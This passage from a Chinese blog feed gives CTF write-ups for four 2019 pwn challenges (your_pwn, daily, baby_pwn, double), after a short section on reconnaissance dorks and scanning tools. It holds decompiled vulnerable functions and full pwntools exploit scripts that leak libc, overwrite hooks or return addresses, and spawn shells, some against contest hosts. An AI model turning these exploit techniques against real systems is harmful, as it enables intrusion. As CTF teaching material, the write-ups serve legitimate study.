rel="noopener">https://www.bishopfox.com/resources/tools/google-hacking-diggity/attack-tools/</a></li><li>gooscan</li></ol><p>检索特定类型的文件 google:  site:sitename filetype: typename, 可能含有敏感文件</p><p>Email泄露网站信息：  metasploit: search_email_collector 模块</p><p>搜索可能存在漏洞的界面，如登陆界面可能存在SQL注入： google: site:sitename inurl:login </p><h2 id="网站目录探索"><a href="#网站目录探索" class="headerlink" title="网站目录探索"></a>网站目录探索</h2><ol><li>google： parent directory site:sitename   // 不是特别好用</li><li>暴力搜索</li></ol><p>metasploit: brute_dirs, dir_listing, dir_scanner<br>工具：御剑，wwwscan， dirbuster，cansina</p><ol start="3"><li>robots.txt 所指出的不应当被抓取的目录及文件</li></ol><h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><p>漏洞搜索引擎：</p><ol><li><a href="https://fofa.so/" target="_blank" rel="noopener">https://fofa.so/</a></li><li><a href="https://www.shodan.io/" target="_blank" rel="noopener">https://www.shodan.io/</a></li></ol><p>工具：</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;DNS-IP-挖掘信息&quot;&gt;&lt;a href=&quot;#DNS-IP-挖掘信息&quot; class=&quot;headerlink&quot; title=&quot;DNS+IP 挖掘信息&quot;&gt;&lt;/a&gt;DNS+IP 挖掘信息&lt;/h1&gt;&lt;h2 id=&quot;域名信息&quot;&gt;&lt;a href=&quot;#域名信息&quot; class=&quot;
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>信安大赛2019-pwn</title>
    <link href="http://siriuswhiter.tk/2019/04/22/%E4%BF%A1%E5%AE%89%E5%A4%A7%E8%B5%9B2019-pwn/"/>
    <id>http://siriuswhiter.tk/2019/04/22/信安大赛2019-pwn/</id>
    <published>2019-04-22T12:01:10.000Z</published>
    <updated>2019-04-23T05:17:51.058Z</updated>
    
    <content type="html"><![CDATA[<p><em>太菜了，堆的题要么找不到洞，要么找不到好的思路，得加紧训练</em></p><h1 id="your-pwn"><a href="#your-pwn" class="headerlink" title="your_pwn"></a>your_pwn</h1><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>关键函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">  memset(&amp;s, 0, 0x100uLL);</span><br><span class="line">  memset(arr, 0, 0x28uLL);</span><br><span class="line">  for ( i = 0; i &lt;= 40; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;input index&quot;);</span><br><span class="line">    __isoc99_scanf(&quot;%d&quot;, &amp;idx);</span><br><span class="line">    printf(&quot;now value(hex) %x\n&quot;, (unsigned int)arr[idx]);</span><br><span class="line">    puts(&quot;input new value&quot;);</span><br><span class="line">    __isoc99_scanf(&quot;%d&quot;, &amp;new_v);</span><br><span class="line">    arr[idx] = new_v;</span><br><span class="line">  &#125;</span><br><span class="line">  puts(&quot;do you want continue(yes/no)? &quot;);</span><br><span class="line">  read(0, &amp;s, 0x100uLL);</span><br><span class="line">  return strncmp(&amp;s, &quot;yes&quot;, 3uLL) == 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>原意是可以给arr的每个地址赋新值，但是因为其没有对idx进行限制，因而相当于任意地址写，同时因为其会先将地址处的值显示出来，因而可以先泄露地址</p><p>通过泄露栈中的libc_start_main+240,得到libc基址同时查询得到libc版本为2.23，因此可以直接计算处one_adget 地址，最后用同样的方法再循环写入返回地址为</p><p>one_gadget即可；</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line">#sh=process(&apos;./pwn&apos;)</span><br><span class="line">sh=remote(&apos;1b190bf34e999d7f752a35fa9ee0d911.kr-lab.com&apos;,&apos;57856&apos;)#(&apos;111.198.29.45&apos;,&apos;32440&apos;)</span><br><span class="line">elf = ELF(&apos;./pwn&apos;)</span><br><span class="line">sh.sendlineafter(&apos;name:&apos;,&apos;name&apos;)</span><br><span class="line"></span><br><span class="line">leak = &apos;&apos;</span><br><span class="line">def scan(idx):</span><br><span class="line">global leak</span><br><span class="line">sh.sendlineafter(&apos;index\n&apos;,str(idx))</span><br><span class="line">sh.recvuntil(&apos;(hex) &apos;)</span><br><span class="line">r = sh.recvuntil(&apos;\n&apos;,drop=True)[-2:]</span><br><span class="line">print r</span><br><span class="line">leak =r+leak</span><br><span class="line">l=int(r,16)</span><br><span class="line">sh.sendlineafter(&apos;value\n&apos;,str(l))</span><br><span class="line"></span><br><span class="line">for i in range(632,638):</span><br><span class="line">scan(i)</span><br><span class="line">leak=leak.ljust(8,&apos;\x00&apos;)</span><br><span class="line">print leak</span><br><span class="line">leak_addr = int(&apos;0x&apos;+leak,16)</span><br><span class="line">print hex(leak_addr)</span><br><span class="line"></span><br><span class="line">libc_start = leak_addr -240 </span><br><span class="line">print &apos;libc_start_main:&apos; + hex(libc_start)</span><br><span class="line">libc = leak_addr-elf.plt[&apos;__libc_start_main&apos;]-0x1ff20</span><br><span class="line">print hex(libc)</span><br><span class="line">#system = libc+ 0x045390</span><br><span class="line">#binsh = libc + 0x18cd57</span><br><span class="line">one = 0x4526a + libc</span><br><span class="line">print &apos;one: &apos;+ hex(one)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ls = [0,0,0,0,0,0,0,0]</span><br><span class="line">for i in range(0,8):</span><br><span class="line">ls[i] = one%0x100</span><br><span class="line">print hex(ls[i])</span><br><span class="line">one /= 0x100</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">for i in range(344,352):</span><br><span class="line">j=i-344</span><br><span class="line">print hex(ls[j])</span><br><span class="line">sh.sendlineafter(&apos;index\n&apos;,str(i))</span><br><span class="line">sh.sendlineafter(&apos;value\n&apos;,str(ls[j]))</span><br><span class="line">#sleep(2)</span><br><span class="line"></span><br><span class="line">#gdb.attach(sh,&apos;b* 0xc2a&apos;+str(libc))</span><br><span class="line">sh.sendlineafter(&apos;index\n&apos;,str(-1))</span><br><span class="line">sh.sendlineafter(&apos;value\n&apos;,str(1))</span><br><span class="line">sh.sendlineafter(&apos;? \n&apos;,&apos;no&apos;)</span><br><span class="line"></span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h1 id="daily"><a href="#daily" class="headerlink" title="daily"></a>daily</h1><p><em>做一半电脑死机了。。坑。。。</em></p><h2 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h2><p><em>漏洞点比较隐蔽，看了好久</em></p><p>关键函数<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">unsigned __int64 remove()</span><br><span class="line">&#123;</span><br><span class="line">  int idx; // [rsp+Ch] [rbp-14h]</span><br><span class="line">  char buf; // [rsp+10h] [rbp-10h]</span><br><span class="line">  unsigned __int64 v3; // [rsp+18h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(0x28u);</span><br><span class="line">  if ( cnt )</span><br><span class="line">  &#123;</span><br><span class="line">    printf(&quot;Please enter the index of daily:&quot;);</span><br><span class="line">    read(0, &amp;buf, 8uLL);</span><br><span class="line">    idx = atoi(&amp;buf);</span><br><span class="line"></span><br><span class="line">    if ( *(_QWORD *)&amp;ptr[4 * idx + 2] )                 // 没有检查idx的大小</span><br><span class="line">    &#123;</span><br><span class="line">      free(*(void **)&amp;ptr[4 * idx + 2]);</span><br><span class="line">      *(_QWORD *)&amp;ptr[4 * idx + 2] = 0LL;</span><br><span class="line">      ptr[4 * idx] = 0;</span><br><span class="line">      puts(&quot;remove successful!!&quot;);</span><br><span class="line">      --cnt;</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">      puts(&quot;invaild index&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;No pages in the daily&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  return __readfsqword(0x28u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h2 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h2><p>前面很容易想到利用malloc_consolidate 来泄露libc地址及heap地址；</p><p>而漏洞点在于在删除chunk时，没有对输入的idx进行检查，所以只要释放的地址处的chunk可以通过检查，就可以被置入bin链表中</p><p>而只要泄露堆地址，就可以运算得到其index，因为输入的是整型数据，所以在一定情况下堆分配离bss段较远时会出错，不过这个问题可以多次尝试来解决</p><p>所以在堆上伪造如同bss段的结构体(size+ptr)，delete时将idx指向这里free掉一个chunk，而因为这样并不会情况bss段存储的结构体，我们就可以UAF</p><p>最后因为尝试one_gadget条件无法满足，最后只能换成调用system函数来覆盖free_hook来getshell</p><h2 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">sh = process(&apos;./pwn&apos;)</span><br><span class="line">#sh = remote(&apos;5f0cfa41a052c741f4beafe9d083d281.kr - lab.com&apos;,58512)</span><br><span class="line">elf = ELF(&apos;./pwn&apos;)</span><br><span class="line">libc = ELF(&apos;/lib/x86_64-linux-gnu/libc-2.23.so&apos;)</span><br><span class="line"></span><br><span class="line">def add(size,con):</span><br><span class="line">    sh.recvuntil(&apos;Your choice:&apos;)</span><br><span class="line">    sh.sendline(&apos;2&apos;)</span><br><span class="line">    sh.recvuntil(&apos;daily:&apos;)</span><br><span class="line">    sh.sendline(str(size))</span><br><span class="line">    sh.recvuntil(&apos;daily\n&apos;)</span><br><span class="line">    sh.send(con)</span><br><span class="line">def dele(idx):</span><br><span class="line">    sh.recvuntil(&apos;choice:&apos;)</span><br><span class="line">    sh.sendline(&apos;4&apos;)</span><br><span class="line">    sh.recvuntil(&apos;daily:&apos;)</span><br><span class="line">    sh.sendline(str(idx))</span><br><span class="line">def edit(idx,con):</span><br><span class="line">    sh.recvuntil(&apos;Your choice:&apos;)</span><br><span class="line">    sh.sendline(&apos;3&apos;)</span><br><span class="line">    sh.recvuntil(&apos;daily:&apos;)</span><br><span class="line">    sh.sendline(str(idx))</span><br><span class="line">    sh.recvuntil(&apos;daily&apos;)</span><br><span class="line">    sh.send(con)</span><br><span class="line">def show():</span><br><span class="line">    sh.recvuntil(&apos;choice:&apos;)</span><br><span class="line">    sh.sendline(&apos;1&apos;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(0x20,&apos;a&apos;)</span><br><span class="line">add(0x800,&apos;a&apos;)</span><br><span class="line">add(0x10,&apos;a&apos;)</span><br><span class="line">dele(1)</span><br><span class="line">add(0x100,&apos;aaaaaa&apos;)</span><br><span class="line">show()</span><br><span class="line">sh.recvuntil(&apos;a&apos;*8)</span><br><span class="line">main_arena = u64(sh.recv(6).ljust(8,&apos;\x00&apos;)) - 0x548</span><br><span class="line"></span><br><span class="line">libc_base = main_arena - libc.symbols[&apos;__malloc_hook&apos;] - 0x10</span><br><span class="line">one_gadget = libc_base + libc.symbols[&apos;system&apos;]</span><br><span class="line">free_hook = libc_base + libc.symbols[&apos;__free_hook&apos;]</span><br><span class="line"></span><br><span class="line">edit(1,&apos;a&apos;*24)</span><br><span class="line">show()</span><br><span class="line">sh.recvuntil(&apos;a&apos;*24)</span><br><span class="line">heap = u64(sh.recv(4).ljust(8,&apos;\x00&apos;))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(0x700-8,&apos;aaa&apos;)</span><br><span class="line">add(0x10,&apos;aaa&apos;)</span><br><span class="line">add(0x10,&apos;aaa&apos;)</span><br><span class="line">dele(4)</span><br><span class="line">dele(5)</span><br><span class="line">index = (heap + 0x10 - 0x602060)/16</span><br><span class="line">payload = p64(0x100) + p64(heap + 0x830 + 0x10)</span><br><span class="line">edit(1,payload)</span><br><span class="line">dele(index)</span><br><span class="line"></span><br><span class="line">add(0x10,p64(0x602058))</span><br><span class="line">add(0x10,&apos;c&apos;)</span><br><span class="line">add(0x10,&apos;d&apos;)</span><br><span class="line">add(0x10,&apos;e&apos;)</span><br><span class="line"></span><br><span class="line">edit(7,p64(free_hook))</span><br><span class="line">edit(0,p64(one_gadget))</span><br><span class="line">edit(1,&apos;/bin/sh\x00&apos;)</span><br><span class="line">dele(1)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h1 id="baby-pwn"><a href="#baby-pwn" class="headerlink" title="baby_pwn"></a>baby_pwn</h1><h2 id="题目-2"><a href="#题目-2" class="headerlink" title="题目"></a>题目</h2><p>关键函数<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ssize_t vuln()</span><br><span class="line">&#123;</span><br><span class="line">  char buf; // [esp+0h] [ebp-28h]</span><br><span class="line"></span><br><span class="line">  return read(0, &amp;buf, 0x100u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>保护<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">arch:     amd64-64-little</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure></p><h2 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h2><p>直接给了溢出，同时除了PIE保护全开，没有给libc，可以确定是ret2_dl_runtime_resolve</p><p>可以直接使用roputils库 ，在bss段伪造结构体 ，然后上脚本即可</p><h2 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">import sys</span><br><span class="line">import roputils</span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line">offset = 44</span><br><span class="line">readplt = 0x08048390</span><br><span class="line">bss = 0x0804a068</span><br><span class="line">vulFunc = 0x0804852d</span><br><span class="line"></span><br><span class="line">#p = process(&apos;./pwn&apos;)</span><br><span class="line">p = remote(&apos;da61f2425ce71e72c1ef02104c3bfb69.kr-lab.com&apos;,&apos;33865&apos;)</span><br><span class="line">rop = roputils.ROP(&apos;./pwn&apos;)</span><br><span class="line">addr_bss = rop.section(&apos;.bss&apos;)</span><br><span class="line"></span><br><span class="line"># step1 : write sh &amp; resolve struct to bss</span><br><span class="line">buf1 = &apos;a&apos; * offset #44</span><br><span class="line">buf1 += p32(readplt) + p32(vulFunc) + p32(0) + p32(addr_bss) + p32(100)</span><br><span class="line">p.send(buf1)</span><br><span class="line"></span><br><span class="line">buf2 =  rop.string(&apos;/bin/sh&apos;)</span><br><span class="line">buf2 += rop.fill(20, buf2)</span><br><span class="line">buf2 += rop.dl_resolve_data(addr_bss+20, &apos;system&apos;)</span><br><span class="line">buf2 += rop.fill(100, buf2)</span><br><span class="line">p.send(buf2)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#step2 : use dl_resolve_call get system &amp; system(&apos;/bin/sh&apos;)</span><br><span class="line">buf3 = &apos;a&apos;*44 + rop.dl_resolve_call(addr_bss+20, addr_bss)</span><br><span class="line">p.send(buf3)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="double"><a href="#double" class="headerlink" title="double"></a>double</h1><p><em>其实很简单的一道题。。。结果当天没做出来。。过了一天，昨天睡觉前突然意识到怎么做。。。最后写出来用了不到20分钟！！难受</em></p><h2 id="题目-3"><a href="#题目-3" class="headerlink" title="题目"></a>题目</h2><p>程序使用链表来记录分配的chunk，删除时也就是链表的元素删除，所以当时会陷入对链表的问题的查找，而实际上问题不在这里</p><p>主要问题函数：</p><p>分配的new函数<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">unsigned __int64 new()</span><br><span class="line">&#123;</span><br><span class="line">  int size; // [rsp+4h] [rbp-12Ch]</span><br><span class="line">  struc *ptr; // [rsp+8h] [rbp-128h]</span><br><span class="line">  struc *last; // [rsp+10h] [rbp-120h]</span><br><span class="line">  char *dest; // [rsp+18h] [rbp-118h]</span><br><span class="line">  char s2; // [rsp+20h] [rbp-110h]</span><br><span class="line">  unsigned __int64 v6; // [rsp+128h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(0x28u);</span><br><span class="line">  ptr = (struc *)malloc(0x18uLL);</span><br><span class="line">  if ( ptr )</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;Your data:&quot;);</span><br><span class="line">    size = get_str(&amp;s2, 0x100);</span><br><span class="line">    last = ptrStop;</span><br><span class="line">    if ( ptrStop &amp;&amp; !strcmp((const char *)ptrStop-&gt;chunk_ptr, &amp;s2) )</span><br><span class="line">    &#123;</span><br><span class="line">      ptr-&gt;idx = last-&gt;idx + 1;</span><br><span class="line">      ptr-&gt;size = last-&gt;size;</span><br><span class="line">      ptr-&gt;chunk_ptr = last-&gt;chunk_ptr;</span><br><span class="line">      ptr-&gt;next_chunk = 0LL;</span><br><span class="line">      last-&gt;next_chunk = (__int64)ptr;</span><br><span class="line">      ptrStop = ptr;</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">      dest = (char *)malloc(size + 1);</span><br><span class="line">      if ( !dest )</span><br><span class="line">      &#123;</span><br><span class="line">        puts(&quot;Malloc Failed, Error&quot;);</span><br><span class="line">        free(ptr);</span><br><span class="line">        return __readfsqword(0x28u) ^ v6;</span><br><span class="line">      &#125;</span><br><span class="line">      strncpy(dest, &amp;s2, size + 1);</span><br><span class="line">      ptr-&gt;size = size;</span><br><span class="line">      ptr-&gt;chunk_ptr = (__int64)dest;</span><br><span class="line">      ptr-&gt;next_chunk = 0LL;</span><br><span class="line">      if ( ptrStart )</span><br><span class="line">      &#123;</span><br><span class="line">        ptr-&gt;idx = last-&gt;idx + 1;</span><br><span class="line">        last-&gt;next_chunk = (__int64)ptr;</span><br><span class="line">      &#125;</span><br><span class="line">      else</span><br><span class="line">      &#123;</span><br><span class="line">        ptr-&gt;idx = 0;</span><br><span class="line">        ptrStart = (__int64)ptr;</span><br><span class="line">      &#125;</span><br><span class="line">      ptrStop = ptr;</span><br><span class="line">    &#125;</span><br><span class="line">    printf(&quot;Success, index: %d\n&quot;, (unsigned int)ptr-&gt;idx);</span><br><span class="line">    return __readfsqword(0x28u) ^ v6;</span><br><span class="line">  &#125;</span><br><span class="line">  puts(&quot;Malloc Failed,Error&quot;);</span><br><span class="line">  return __readfsqword(0x28u) ^ v6;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h2 id="分析-3"><a href="#分析-3" class="headerlink" title="分析"></a>分析</h2><p>这个程序的问题在于分配chunk时，会检查内容是否相同，如果相同的话，就不再多分配chunk，只会分配结构体 chunk然后将其中的指针指向已知的chunk，也就会出现两个指针指向同一个chunk，我们就可以UAF</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if ( ptrStop &amp;&amp; !strcmp((const char *)ptrStop-&gt;chunk_ptr, &amp;s2) )</span><br></pre></td></tr></table></figure><p>而其实这就已经是极大的漏洞了，利用这个洞完全可以泄露libc然后覆盖fd指针到malloc_hook， one_gadget 一把梭getshell</p><p><em>完全没必要总去想着控制链表指针什么的…费力不讨好</em></p><h2 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">#context.log_level = &apos;debug&apos;</span><br><span class="line"></span><br><span class="line">sh=process(&apos;./pwn&apos;)</span><br><span class="line">#sh=remote(&apos;&apos;)#(&apos;85c3e0fcae5e972af313488de60e8a5a.kr-lab.com&apos;,&apos;58512&apos;)#(&apos;111.198.29.45&apos;,&apos;32440&apos;)</span><br><span class="line">elf = ELF(&apos;./pwn&apos;)</span><br><span class="line"></span><br><span class="line">def show(idx):</span><br><span class="line">sh.sendlineafter(&apos;&gt; &apos;,&apos;2&apos;)</span><br><span class="line">sh.sendlineafter(&apos;index: &apos;,str(idx))</span><br><span class="line">def new(con):</span><br><span class="line">sh.sendlineafter(&apos;&gt; &apos;,&apos;1&apos;)</span><br><span class="line">sh.sendlineafter(&apos;data:\n&apos;,con)</span><br><span class="line"></span><br><span class="line">def edit(idx,con):</span><br><span class="line">        sh.sendlineafter(&apos;&gt; &apos;,&apos;3&apos;)</span><br><span class="line">        sh.sendlineafter(&apos;index: &apos;,str(idx))</span><br><span class="line">        sh.sendline(con)</span><br><span class="line"></span><br><span class="line">def dele(idx):</span><br><span class="line">        sh.sendlineafter(&apos;&gt; &apos;,&apos;4&apos;)</span><br><span class="line">        sh.sendlineafter(&apos;index: &apos;,str(idx))</span><br><span class="line"></span><br><span class="line">new(&apos;a&apos;*8)</span><br><span class="line">new(&apos;a&apos;*8)</span><br><span class="line">new(&apos;b&apos;*8)</span><br><span class="line">new(&apos;c&apos;*0x80)</span><br><span class="line">new(&apos;c&apos;*0x80)</span><br><span class="line">new(&apos;d&apos;*0x60)</span><br><span class="line">new(&apos;d&apos;*0x60)</span><br><span class="line"></span><br><span class="line">new(&apos;e&apos;*0x20)</span><br><span class="line"></span><br><span class="line">#----------------leak heap base------------------------------//没有必要， 所以其实可以更短</span><br><span class="line">dele(2)</span><br><span class="line">dele(0)</span><br><span class="line">show(1)</span><br><span class="line">heap = u64(sh.recvuntil(&apos;\n&apos;,drop=True).ljust(8,&apos;\x00&apos;))-0x60</span><br><span class="line">print hex(heap)</span><br><span class="line"></span><br><span class="line">new(&apos;d&apos;*8)</span><br><span class="line">new(&apos;a&apos;*8)</span><br><span class="line">#---------------leak libc base-----------------------------</span><br><span class="line">dele(3)</span><br><span class="line">show(4)</span><br><span class="line"></span><br><span class="line">libc = u64(sh.recvuntil(&apos;\n&apos;,drop=True).ljust(8,&apos;\x00&apos;))-88-0x3c4b20</span><br><span class="line">print hex(libc)</span><br><span class="line">one = 